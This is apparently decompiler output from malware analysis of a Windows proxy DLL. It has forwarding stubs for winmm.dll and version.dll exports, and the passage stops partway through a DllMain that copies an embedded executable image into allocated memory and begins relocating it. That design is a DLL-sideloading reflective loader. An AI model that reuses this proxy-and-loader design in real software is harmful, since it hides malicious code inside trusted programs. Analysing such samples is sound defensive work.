                    /* WARNING: Could not recover jumptable at 0x0001800048b2. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pmmt,CONCAT44(in_register_00000084,cbmmt));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800048c1 waveOutGetVolume; Evidence ev_bbc8b66abebf0b18008aa32367cfee4c85874d57a3e29b5007c5e382848eac1d */

MMRESULT __stdcall waveOutGetVolume(HWAVEOUT hwo,LPDWORD pdwVolume)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x48c1  187  waveOutGetVolume */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutGetVolume");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004909. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pdwVolume);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004918 waveOutMessage; Evidence ev_37b80e7c9a555cb0fae4d1f6b3a99033619808da9caed00c1996796ecc44c7d8 */

MMRESULT __stdcall waveOutMessage(HWAVEOUT hwo,UINT uMsg,DWORD_PTR dw1,DWORD_PTR dw2)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x4918  188  waveOutMessage */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutMessage");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004960. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,CONCAT44(in_register_00000014,uMsg),dw1,dw2);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x18000496f waveOutOpen; Evidence ev_ffdd9a85049219cd655a9960f4b0b1e4a3787af2db763c628d02625f6657ca98 */

MMRESULT __stdcall
waveOutOpen(LPHWAVEOUT phwo,UINT uDeviceID,LPCWAVEFORMATEX pwfx,DWORD_PTR dwCallback,
           DWORD_PTR dwInstance,DWORD fdwOpen)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x496f  189  waveOutOpen */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutOpen");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x0001800049b7. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (phwo,CONCAT44(in_register_00000014,uDeviceID),pwfx,dwCallback);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x1800049c6 waveOutPause; Evidence ev_3cc9052842296af6ea4348d2868c3d243a2a5c4ad8d25aec8ee7d7a62fedc455 */

MMRESULT __stdcall waveOutPause(HWAVEOUT hwo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x49c6  190  waveOutPause */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutPause");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004a0e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004a1d waveOutPrepareHeader; Evidence ev_d0c78d85b2acaae01152e60f23bcd5fb2ef35aecb4f6de0ad870d48d10f2ed76 */

MMRESULT __stdcall waveOutPrepareHeader(HWAVEOUT hwo,LPWAVEHDR pwh,UINT cbwh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4a1d  191  waveOutPrepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutPrepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004a65. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pwh,CONCAT44(in_register_00000084,cbwh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004a74 waveOutReset; Evidence ev_337fa11cb982b7d118a4c1e4e7095ee7ebdde9bc885d64d5916a1c5e341c50b2 */

MMRESULT __stdcall waveOutReset(HWAVEOUT hwo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4a74  192  waveOutReset */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutReset");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004abc. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004acb waveOutRestart; Evidence ev_60bf82602369ca6a77874e17b79efa5f44f04ef59eb8348c36334cd325994575 */

MMRESULT __stdcall waveOutRestart(HWAVEOUT hwo)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4acb  193  waveOutRestart */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutRestart");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004b13. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo);
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004b22 waveOutSetPitch; Evidence ev_a7a3ef1b61e98d22fc4c7830b0a415365a5517625dbf7ad9fa085642a6674c10 */

MMRESULT __stdcall waveOutSetPitch(HWAVEOUT hwo,DWORD dwPitch)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x4b22  194  waveOutSetPitch */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutSetPitch");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004b6a. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,CONCAT44(in_register_00000014,dwPitch));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004b79 waveOutSetPlaybackRate; Evidence ev_7466814cb94371096b0016fe1859b7a040dafa55040fcd841c2cba7cd27cc53d */

MMRESULT __stdcall waveOutSetPlaybackRate(HWAVEOUT hwo,DWORD dwRate)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x4b79  195  waveOutSetPlaybackRate */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutSetPlaybackRate");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004bc1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,CONCAT44(in_register_00000014,dwRate));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004bd0 waveOutSetVolume; Evidence ev_bca3cb9feabe0fb38912bbf45dcbe244b275f3a8b49617cfbc35420b376ca50c */

MMRESULT __stdcall waveOutSetVolume(HWAVEOUT hwo,DWORD dwVolume)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000014;
  
                    /* 0x4bd0  196  waveOutSetVolume */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutSetVolume");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004c18. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,CONCAT44(in_register_00000014,dwVolume));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004c27 waveOutUnprepareHeader; Evidence ev_247348b15fcba2a19aa0bd6b6145bebb7da6d603908e84e6741c892475b572f6 */

MMRESULT __stdcall waveOutUnprepareHeader(HWAVEOUT hwo,LPWAVEHDR pwh,UINT cbwh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4c27  197  waveOutUnprepareHeader */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutUnprepareHeader");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004c6f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pwh,CONCAT44(in_register_00000084,cbwh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004c7e waveOutWrite; Evidence ev_d66f0acf89d9922a3be8d160cfb095d99e4c4376c8f753845b63260d1c1e8b01 */

MMRESULT __stdcall waveOutWrite(HWAVEOUT hwo,LPWAVEHDR pwh,UINT cbwh)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_00000084;
  
                    /* 0x4c7e  198  waveOutWrite */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"waveOutWrite");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004cc6. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(hwo,pwh,CONCAT44(in_register_00000084,cbwh));
      return (MMRESULT)IVar1;
    }
  }
  return 0;
}



/* 0x180004cd5 WOWAppExit; Evidence ev_6f1a3d979e6e0a2ecf66a1af2bc7ec35567c41e85fdac7ace00cccca89c7e3aa */

INT_PTR WOWAppExit(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  
                    /* 0x4cd5  29  WOWAppExit */
  if (DAT_18000e078 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e078,"WOWAppExit");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004d1d. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
      return IVar1;
    }
  }
  return 0;
}



/* 0x180004d2c VerLanguageNameA; Evidence ev_e534548b2ec76dbd980193bc8af684e1a85da85b021dba4ab554b80db7176366 */

DWORD __stdcall VerLanguageNameA(DWORD wLang,LPSTR szLang,DWORD cchLang)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x4d2c  25  VerLanguageNameA */
  if (DAT_18000e080 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e080,"VerLanguageNameA");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004d74. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,wLang),szLang,
                         CONCAT44(in_register_00000084,cchLang));
      return (DWORD)IVar1;
    }
  }
  return 0;
}



/* 0x180004d83 VerLanguageNameW; Evidence ev_4fca8e8ea0ea71c0adf60f8cd111cb5c0f18d3138eb53c83e722db1f1f691289 */

DWORD __stdcall VerLanguageNameW(DWORD wLang,LPWSTR szLang,DWORD cchLang)

{
  FARPROC UNRECOVERED_JUMPTABLE;
  INT_PTR IVar1;
  undefined4 in_register_0000000c;
  undefined4 in_register_00000084;
  
                    /* 0x4d83  26  VerLanguageNameW */
  if (DAT_18000e080 != (HMODULE)0x0) {
    UNRECOVERED_JUMPTABLE = GetProcAddress(DAT_18000e080,"VerLanguageNameW");
    if (UNRECOVERED_JUMPTABLE != (FARPROC)0x0) {
                    /* WARNING: Could not recover jumptable at 0x000180004dcb. Too many branches */
                    /* WARNING: Treating indirect jump as call */
      IVar1 = (*UNRECOVERED_JUMPTABLE)
                        (CONCAT44(in_register_0000000c,wLang),szLang,
                         CONCAT44(in_register_00000084,cchLang));
      return (DWORD)IVar1;
    }
  }
  return 0;
}



/* 0x180004dda GetFileVersionInfoA; Evidence ev_4badacd0a18495fbee48af719a5d0ad96eef78cc25dab09b55548300bf83201b */

BOOL __stdcall GetFileVersionInfoA(LPCSTR lptstrFilename,DWORD dwHandle,DWORD dwLen,LPVOID lpData)

{
  INT_PTR IVar1;
  
                    /* 0x4dda  7  GetFileVersionInfoA */
  if ((DAT_18000e000 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e000 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoA"),
      DAT_18000e000 == (FARPROC)0x0)))) {
    DAT_18000e000 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180004e0e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e000)(lptstrFilename,(ulonglong)dwHandle,dwLen,lpData);
  return (BOOL)IVar1;
}



/* 0x180004e4f GetFileVersionInfoByHandle; Evidence ev_0a423c19bf9fe32db3d62b43757b664eb987b1cea7d412b31982519b5db65bad */

INT_PTR GetFileVersionInfoByHandle(undefined8 param_1,uint param_2,undefined8 param_3)

{
  INT_PTR IVar1;
  
                    /* 0x4e4f  8  GetFileVersionInfoByHandle */
  if ((DAT_18000e008 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e008 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoByHandle"),
      DAT_18000e008 == (FARPROC)0x0)))) {
    DAT_18000e008 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180004e79. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e008)(param_1,(ulonglong)param_2,param_3);
  return IVar1;
}



/* 0x180004eb8 GetFileVersionInfoExA; Evidence ev_b6f75f6277bb6d9de363806e9e4d5107948dc3eb98913d3e78d39aa1b63c82a5 */

BOOL __stdcall
GetFileVersionInfoExA(DWORD dwFlags,LPCSTR lpwstrFilename,DWORD dwHandle,DWORD dwLen,LPVOID lpData)

{
  INT_PTR IVar1;
  
                    /* 0x4eb8  9  GetFileVersionInfoExA */
  if ((DAT_18000e010 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e010 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoExA"),
      DAT_18000e010 == (FARPROC)0x0)))) {
    DAT_18000e010 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180004eea. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e010)((ulonglong)dwFlags,lpwstrFilename,dwHandle,dwLen);
  return (BOOL)IVar1;
}



/* 0x180004f2a GetFileVersionInfoExW; Evidence ev_4f2925c76e5c824ab7eb764d2d3020f3078853c2d6eda5b618c244ae17427958 */

BOOL __stdcall
GetFileVersionInfoExW(DWORD dwFlags,LPCWSTR lpwstrFilename,DWORD dwHandle,DWORD dwLen,LPVOID lpData)

{
  INT_PTR IVar1;
  
                    /* 0x4f2a  10  GetFileVersionInfoExW */
  if ((DAT_18000e018 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e018 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoExW"),
      DAT_18000e018 == (FARPROC)0x0)))) {
    DAT_18000e018 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180004f5c. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e018)((ulonglong)dwFlags,lpwstrFilename,dwHandle,dwLen);
  return (BOOL)IVar1;
}



/* 0x180004f9c GetFileVersionInfoSizeA; Evidence ev_6d39d509877f15fc1cf6d6d99728a5943e65017ef27eb8c34e86a62fde02b479 */

DWORD __stdcall GetFileVersionInfoSizeA(LPCSTR lptstrFilename,LPDWORD lpdwHandle)

{
  INT_PTR IVar1;
  
                    /* 0x4f9c  11  GetFileVersionInfoSizeA */
  if ((DAT_18000e020 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e020 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoSizeA"),
      DAT_18000e020 == (FARPROC)0x0)))) {
    DAT_18000e020 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180004fc0. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e020)(lptstrFilename,lpdwHandle);
  return (DWORD)IVar1;
}



/* 0x180004ffe GetFileVersionInfoSizeExA; Evidence ev_6473d3c0d1b515ff22ca2f1aa20c4f1cd087b39120e544c7b3977e263c1d10c0 */

DWORD __stdcall GetFileVersionInfoSizeExA(DWORD dwFlags,LPCSTR lpwstrFilename,LPDWORD lpdwHandle)

{
  INT_PTR IVar1;
  
                    /* 0x4ffe  12  GetFileVersionInfoSizeExA */
  if ((DAT_18000e028 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e028 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoSizeExA"),
      DAT_18000e028 == (FARPROC)0x0)))) {
    DAT_18000e028 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180005028. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e028)((ulonglong)dwFlags,lpwstrFilename,lpdwHandle);
  return (DWORD)IVar1;
}



/* 0x180005067 GetFileVersionInfoSizeExW; Evidence ev_8deb847725f53a24a33af422c50f110d16af09c6d1d09763075adc30edd55513 */

DWORD __stdcall GetFileVersionInfoSizeExW(DWORD dwFlags,LPCWSTR lpwstrFilename,LPDWORD lpdwHandle)

{
  INT_PTR IVar1;
  
                    /* 0x5067  13  GetFileVersionInfoSizeExW */
  if ((DAT_18000e030 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e030 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoSizeExW"),
      DAT_18000e030 == (FARPROC)0x0)))) {
    DAT_18000e030 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180005091. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e030)((ulonglong)dwFlags,lpwstrFilename,lpdwHandle);
  return (DWORD)IVar1;
}



/* 0x1800050d0 GetFileVersionInfoSizeW; Evidence ev_ed9d1a1c9f678024ee100c7420b155e17bbebdc13829335ed950da174ca58a93 */

DWORD __stdcall GetFileVersionInfoSizeW(LPCWSTR lptstrFilename,LPDWORD lpdwHandle)

{
  INT_PTR IVar1;
  
                    /* 0x50d0  14  GetFileVersionInfoSizeW */
  if ((DAT_18000e038 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e038 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoSizeW"),
      DAT_18000e038 == (FARPROC)0x0)))) {
    DAT_18000e038 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x0001800050f4. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e038)(lptstrFilename,lpdwHandle);
  return (DWORD)IVar1;
}



/* 0x180005132 GetFileVersionInfoW; Evidence ev_4f241992b119837f3fd58675efefbbe9fed0541b84dafcac055972dfb5fec4d9 */

BOOL __stdcall GetFileVersionInfoW(LPCWSTR lptstrFilename,DWORD dwHandle,DWORD dwLen,LPVOID lpData)

{
  INT_PTR IVar1;
  
                    /* 0x5132  15  GetFileVersionInfoW */
  if ((DAT_18000e040 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e040 = GetProcAddress(DAT_18000e088,"GetFileVersionInfoW"),
      DAT_18000e040 == (FARPROC)0x0)))) {
    DAT_18000e040 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180005166. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e040)(lptstrFilename,(ulonglong)dwHandle,dwLen,lpData);
  return (BOOL)IVar1;
}



/* 0x1800051a7 VerFindFileA; Evidence ev_887e1ce6f7ffa56bb432cc245a227c7ca0913a1225eee5f9fb9e1204dea22e9d */

DWORD __stdcall
VerFindFileA(DWORD uFlags,LPCSTR szFileName,LPCSTR szWinDir,LPCSTR szAppDir,LPSTR szCurDir,
            PUINT lpuCurDirLen,LPSTR szDestDir,PUINT lpuDestDirLen)

{
  INT_PTR IVar1;
  
                    /* 0x51a7  21  VerFindFileA */
  if ((DAT_18000e048 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e048 = GetProcAddress(DAT_18000e088,"VerFindFileA"), DAT_18000e048 == (FARPROC)0x0))
     )) {
    DAT_18000e048 = (FARPROC)0x0;
    return 0xffffffff;
  }
                    /* WARNING: Could not recover jumptable at 0x0001800051d9. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e048)((ulonglong)uFlags,szFileName,szWinDir,szAppDir);
  return (DWORD)IVar1;
}



/* 0x18000521c VerFindFileW; Evidence ev_2051b5f94f161a0df83567c4e1f065db5dc0f415d7720e44d79b03394bc1d06b */

DWORD __stdcall
VerFindFileW(DWORD uFlags,LPCWSTR szFileName,LPCWSTR szWinDir,LPCWSTR szAppDir,LPWSTR szCurDir,
            PUINT lpuCurDirLen,LPWSTR szDestDir,PUINT lpuDestDirLen)

{
  INT_PTR IVar1;
  
                    /* 0x521c  22  VerFindFileW */
  if ((DAT_18000e050 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e050 = GetProcAddress(DAT_18000e088,"VerFindFileW"), DAT_18000e050 == (FARPROC)0x0))
     )) {
    DAT_18000e050 = (FARPROC)0x0;
    return 0xffffffff;
  }
                    /* WARNING: Could not recover jumptable at 0x00018000524e. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e050)((ulonglong)uFlags,szFileName,szWinDir,szAppDir);
  return (DWORD)IVar1;
}



/* 0x180005291 VerInstallFileA; Evidence ev_d5750163664e86d3a39cab63b41a0ed216c75a3b767b328f93ce47e68ec4dbda */

DWORD __stdcall
VerInstallFileA(DWORD uFlags,LPCSTR szSrcFileName,LPCSTR szDestFileName,LPCSTR szSrcDir,
               LPCSTR szDestDir,LPCSTR szCurDir,LPSTR szTmpFile,PUINT lpuTmpFileLen)

{
  INT_PTR IVar1;
  
                    /* 0x5291  23  VerInstallFileA */
  if ((DAT_18000e058 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e058 = GetProcAddress(DAT_18000e088,"VerInstallFileA"),
      DAT_18000e058 == (FARPROC)0x0)))) {
    DAT_18000e058 = (FARPROC)0x0;
    return 0xffffffff;
  }
                    /* WARNING: Could not recover jumptable at 0x0001800052c3. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e058)((ulonglong)uFlags,szSrcFileName,szDestFileName,szSrcDir);
  return (DWORD)IVar1;
}



/* 0x180005306 VerInstallFileW; Evidence ev_ca89f8b766f72dbce3bc9d55114e8282665b8b0c89cb50d117f3703acbae864e */

DWORD __stdcall
VerInstallFileW(DWORD uFlags,LPCWSTR szSrcFileName,LPCWSTR szDestFileName,LPCWSTR szSrcDir,
               LPCWSTR szDestDir,LPCWSTR szCurDir,LPWSTR szTmpFile,PUINT lpuTmpFileLen)

{
  INT_PTR IVar1;
  
                    /* 0x5306  24  VerInstallFileW */
  if ((DAT_18000e060 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e060 = GetProcAddress(DAT_18000e088,"VerInstallFileW"),
      DAT_18000e060 == (FARPROC)0x0)))) {
    DAT_18000e060 = (FARPROC)0x0;
    return 0xffffffff;
  }
                    /* WARNING: Could not recover jumptable at 0x000180005338. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e060)((ulonglong)uFlags,szSrcFileName,szDestFileName,szSrcDir);
  return (DWORD)IVar1;
}



/* 0x18000537b VerQueryValueA; Evidence ev_caa131863b35ea4387393189980bc41d2a0b265b2dc09d4520422b17e6d21cf9 */

BOOL __stdcall VerQueryValueA(LPCVOID pBlock,LPCSTR lpSubBlock,LPVOID *lplpBuffer,PUINT puLen)

{
  INT_PTR IVar1;
  
                    /* 0x537b  27  VerQueryValueA */
  if ((DAT_18000e068 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e068 = GetProcAddress(DAT_18000e088,"VerQueryValueA"), DAT_18000e068 == (FARPROC)0x0
      )))) {
    DAT_18000e068 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x0001800053b1. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e068)(pBlock,lpSubBlock,lplpBuffer,puLen);
  return (BOOL)IVar1;
}



/* 0x1800053f2 VerQueryValueW; Evidence ev_06cce5fead2e4c331d5cb2358e82feaba0944753f47937349f61655188686d3a */

BOOL __stdcall VerQueryValueW(LPCVOID pBlock,LPCWSTR lpSubBlock,LPVOID *lplpBuffer,PUINT puLen)

{
  INT_PTR IVar1;
  
                    /* 0x53f2  28  VerQueryValueW */
  if ((DAT_18000e070 == (FARPROC)0x0) &&
     ((DAT_18000e088 == (HMODULE)0x0 ||
      (DAT_18000e070 = GetProcAddress(DAT_18000e088,"VerQueryValueW"), DAT_18000e070 == (FARPROC)0x0
      )))) {
    DAT_18000e070 = (FARPROC)0x0;
    return 0;
  }
                    /* WARNING: Could not recover jumptable at 0x000180005428. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  IVar1 = (*DAT_18000e070)(pBlock,lpSubBlock,lplpBuffer,puLen);
  return (BOOL)IVar1;
}



/* 0x180005469 DllMain; Evidence ev_23568aa218e01d97fd051be5769392509fee713e9aaa81603d524ced690884e2 */

undefined8 DllMain(undefined8 param_1,int param_2)

{
  longlong *plVar1;
  int *piVar2;
  ulonglong *puVar3;
  ushort uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  LPVOID lpAddress;
  longlong lVar8;
  HMODULE hModule;
  FARPROC pFVar9;
  DWORD DVar10;
  uint *puVar11;
  LPCSTR lpProcName;
  LPVOID pvVar12;
  DWORD flNewProtect;
  ulonglong uVar13;
  ulonglong uVar14;
  bool bVar15;
  DWORD local_44;
  
                    /* 0x5469  3  DllMain */
  if (param_2 == 1) {
    DAT_18000e078 = LoadLibraryW(L"C:\\Windows\\System32\\winmm.dll");
    DAT_18000e080 = GetModuleHandleW(L"C:\\Windows\\System32\\kernel32.dll");
    DAT_18000e088 = LoadLibraryW(L"C:\\Windows\\System32\\version.dll");
    lpAddress = VirtualAlloc((LPVOID)0x0,0xa000,0x3000,4);
    if (lpAddress != (LPVOID)0x0) {
      lVar8 = 0;
      do {
        *(undefined1 *)((longlong)lpAddress + lVar8) = (&DAT_180006d80)[lVar8];
        lVar8 = lVar8 + 1;
      } while (lVar8 != 0x400);
      lVar8 = 0;
      do {
        uVar7 = (&DAT_180006fa0)[lVar8 * 10];
        if ((ulonglong)uVar7 != 0) {
          uVar5 = (&DAT_180006f9c)[lVar8 * 10];
          uVar6 = (&DAT_180006fa4)[lVar8 * 10];
          uVar13 = 0;
          do {
            *(undefined1 *)((longlong)lpAddress + uVar13 + uVar5) = (&DAT_180006d80)[uVar6 + uVar13]
            ;
            uVar13 = uVar13 + 1;
          } while (uVar7 != uVar13);
        }
        lVar8 = lVar8 + 1;
      } while (lVar8 != 5);
      if (*(int *)((longlong)lpAddress + 0x9000) != 0) {
        puVar11 = (uint *)((longlong)lpAddress + 0x9000);
        do {
          uVar13 = (ulonglong)puVar11[1];
          if ((uVar13 + 0x1fffffff8 & 0x1fffffffe) != 0) {
            uVar14 = 0;
            do {
              uVar4 = *(ushort *)((longlong)puVar11 + uVar14 * 2 + 8);
